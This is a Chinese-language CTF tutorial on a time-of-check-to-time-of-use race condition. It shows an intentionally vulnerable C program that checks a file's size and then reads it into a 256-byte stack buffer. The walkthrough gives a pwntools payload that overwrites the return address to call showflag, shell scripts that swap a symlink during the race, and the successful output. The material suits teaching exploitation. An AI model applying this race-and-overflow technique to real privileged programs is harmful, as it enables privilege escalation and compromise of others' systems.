# 题目

## 构造例子

### 源代码

源代码如下

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
void showflag() { system("cat flag"); }
void vuln(char *file, char *buf) {
  int number;
  int index = 0;
  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open file failed!!");
    return;
  }
  while (1) {
    number = read(fd, buf + index, 128);
    if (number <= 0) {
      break;
    }
    index += number;
  }
  buf[index + 1] = '\x00';
}
void check(char *file) {
  struct stat tmp;
  if (strcmp(file, "flag") == 0) {
    puts("file can not be flag!!");
    exit(0);
  }
  stat(file, &tmp);
  if (tmp.st_size > 255) {
    puts("file size is too large!!");
    exit(0);
  }
}
int main(int argc, char *argv[argc]) {
  char buf[256];
  if (argc == 2) {
    check(argv[1]);
    vuln(argv[1], buf);
  } else {
    puts("Usage ./prog <filename>");
  }
  return 0;
}
```

### 分析

可以看出程序的基本流程如下

- 检查传入的命令行参数是不是 “flag”，如果是的话，就退出。
- 检查传入的命令行参数对应的文件大小是否大于 255，是的话，就直接退出。
- 将命令行参数所对应的文件内容读入到 buf 中 ，buf 的大小为 256。

看似我们检查了文件的大小，同时 buf 的大小也可以满足对应的最大大小，但是这里存在一个条件竞争的问题。

如果我们在程序检查完对应的文件大小后，将对应的文件删除，并符号链接到另外一个更大的文件，那么程序所读入的内容就会更多，从而就会产生栈溢出。

### 基本思路

那么，基本思路来了，我们是想要获得对应的`flag`的内容。那么我们只要通过栈溢出修改对应的`main`函数的返回地址即可，通过反汇编以及调试可以获得`showflag`的地址，获得对应的payload

```python
➜  racetest cat payload.py 
from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
```

对应两个条件竞争的脚本为

```sh
➜  racetest cat exp.sh    
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
➜  racetest cat run.sh 
#!/bin/sh
for i in `seq 1000`
do
    ./test fake
done
```

其中 exp 用于来竞争在相应的窗口内删除 fake 文件，同时执行符号链接。run 用来执行程序。

### 具体效果

```shell
➜  racetest (sh exp.sh &) && sh run.sh
[...]
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
flag{race_condition_succeed!}
[...]
```

其中成功的关键在于对应的 `sleep` 的时间选择。

# 参考

- http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html
- http://www.cnblogs.com/huxiao-tee/p/4660352.html
- https://github.com/dirtycow/dirtycow.github.io